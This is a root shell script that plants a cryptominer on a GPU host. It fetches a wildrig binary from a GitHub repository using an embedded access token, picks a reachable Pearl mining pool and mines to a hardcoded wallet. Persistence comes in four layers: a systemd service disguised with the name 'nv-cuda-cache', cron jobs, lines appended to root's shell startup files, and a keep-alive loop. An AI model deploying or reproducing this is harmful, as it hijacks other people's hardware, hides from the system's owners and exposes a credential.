#!/bin/sh
# UL plant_local — runs ON the GPU host (root or sudo), canonical wallet, 4-layer persistence.
set -x
W=${WORKER:?worker required}
WALLET=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
K=${K:-/root/.k}
id -u
mkdir -p "$K"; cd "$K" || exit 1

echo "== gpu =="
nvidia-smi -L 2>&1 | head -10
echo "== existing =="
ps -eo pid,etime,args 2>/dev/null | grep -Ei "wildrig|krig|peak|xmrig|srbminer" | grep -v grep | head -6

if [ ! -x ./wildrig ]; then
  if command -v curl >/dev/null 2>&1; then
    curl -sL -H "Authorization: token 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" \
      -H "Accept: application/vnd.github.raw" \
      "https://api.github.com/repos/dongsuju/ul-plant/contents/vantage/bin/wildrig.gz?ref=main" -o w.gz
  else
    wget -q --header="Authorization: token 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" \
      --header="Accept: application/vnd.github.raw" \
      -O w.gz "https://api.github.com/repos/dongsuju/ul-plant/contents/vantage/bin/wildrig.gz?ref=main"
  fi
  gunzip -f w.gz && mv -f w wildrig && chmod +x wildrig
fi
ls -la ./wildrig

echo "== pool ladder =="
POOL=""
for HP in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 prl-eu.kryptex.network:7048 prl-us.kryptex.network:7048 pool.pearlhash.xyz:9000 pool.pearlhash.xyz:9443 pearl.luckypool.io:443 pearl.luckypool.io:3360; do
  H=$(echo "$HP" | cut -d: -f1); P=$(echo "$HP" | cut -d: -f2)
  if timeout 6 python3 -c "import socket;s=socket.create_connection(('$H',$P),5);s.close()" 2>/dev/null; then
    echo "OPEN $HP"
    [ -z "$POOL" ] && POOL="$HP"
  else
    echo "FAIL $HP"
  fi
done
[ -z "$POOL" ] && echo "NO_POOL_REACHABLE" && POOL="prl-sg.kryptex.network:7048"
case "$POOL" in
  *:443|*:9443) URL="stratum+ssl://$POOL" ;;
  *) URL="$POOL" ;;
esac
echo "CHOSEN=$URL"

cat > keep.sh <<'S'
#!/bin/sh
K="$1"; W="$2"; U="$3"
cd "$K" || exit 1
while true; do
  if ! pgrep -f "wildrig --algo pearlhash.*$W" >/dev/null 2>&1; then
    setsid nohup ./wildrig --algo pearlhash --url "$U" \
      --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz."$W" --pass x \
      >> m.log 2>&1 &
  fi
  sleep 60
done
S
chmod +x keep.sh

# layer 1: systemd
if command -v systemctl >/dev/null 2>&1; then
  cat > /etc/systemd/system/nv-cuda-cache.service <<S
[Unit]
Description=nv cuda cache helper
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/sh $K/keep.sh $K $W $URL
Restart=always
RestartSec=30
Nice=19
[Install]
WantedBy=multi-user.target
S
  systemctl daemon-reload 2>/dev/null
  systemctl enable --now nv-cuda-cache.service 2>&1 | head -2
fi
# layer 2: cron
if command -v crontab >/dev/null 2>&1; then
  ( crontab -l 2>/dev/null | grep -v "keep.sh"; echo "@reboot /bin/sh $K/keep.sh $K $W $URL >/dev/null 2>&1"; echo "*/5 * * * * /bin/sh $K/keep.sh $K $W $URL >/dev/null 2>&1" ) | crontab -
fi
# layer 3: shell rc
for RC in /root/.bashrc /root/.profile; do
  [ -f "$RC" ] && { grep -q "keep.sh" "$RC" 2>/dev/null || echo "setsid /bin/sh $K/keep.sh $K $W $URL >/dev/null 2>&1 &" >> "$RC"; }
done
# layer 4: keep loop
pgrep -f "keep.sh $K" >/dev/null 2>&1 || setsid nohup ./keep.sh "$K" "$W" "$URL" >/dev/null 2>&1 &
sleep 25
echo "== status =="
pgrep -fa wildrig | head -3
systemctl is-active nv-cuda-cache.service 2>/dev/null
tail -20 m.log 2>/dev/null
